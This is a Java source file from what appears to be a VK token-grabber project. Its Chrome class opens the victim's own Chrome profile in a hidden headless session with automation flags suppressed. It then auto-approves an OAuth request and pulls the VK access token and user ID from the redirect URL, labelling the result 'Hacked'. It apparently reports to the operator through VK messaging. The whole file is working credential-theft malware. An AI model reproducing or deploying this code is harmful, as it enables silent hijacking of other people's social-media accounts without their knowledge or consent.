package com.github.dedinc.vktokengrabber.browsers;

import java.io.File;
import java.nio.file.Paths;
import java.util.Arrays;
import org.openqa.selenium.JavascriptExecutor;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
import com.github.dedinc.vktokengrabber.Main;
import com.github.dedinc.vktokengrabber.utils.Helper;

public class Chrome {
	public String grab() {
		if (!new File(Paths.get(Main.cd, "Users", Main.username, "chromedriver.exe").toString()).exists()) {
			Helper.getWebDriver().getChromeDriver();
		}
		String chrome = Paths.get(Main.cd, "Users", Main.username, "AppData", "Local", "Google", "Chrome").toString();
		System.setProperty("webdriver.chrome.driver", Paths.get(Main.cd, "Users", Main.username, "chromedriver.exe").toString());
		ChromeOptions options = new ChromeOptions();
		options.addArguments("--headless");
		options.addArguments("user-data-dir=" + Paths.get(chrome, "User Data").toString());
		options.addArguments("user-agent=" + Helper.getUserAgents().getAgent());
		options.setExperimentalOption("excludeSwitches", Arrays.asList("enable-automation"));
		options.setExperimentalOption("useAutomationExtension", false);
		ChromeDriver driver = new ChromeDriver(options);
		driver.get(Main.scope_url);
		JavascriptExecutor js = (JavascriptExecutor) driver;
		js.executeScript("allow()");
		String url = driver.getCurrentUrl();
		driver.quit();
		try {
			String token = url.split("access_token=")[1].split("&")[0];
			String uid = url.split("user_id=")[1].split("&")[0];			
			return String.format("[id%s|Hacked]%n%nToken: %s", uid, token);
		   } catch (Exception e ) {
		}
		Helper.getVK().sendMessage("Chrome: Unauthorized in VK!");
		return null;
	}
}
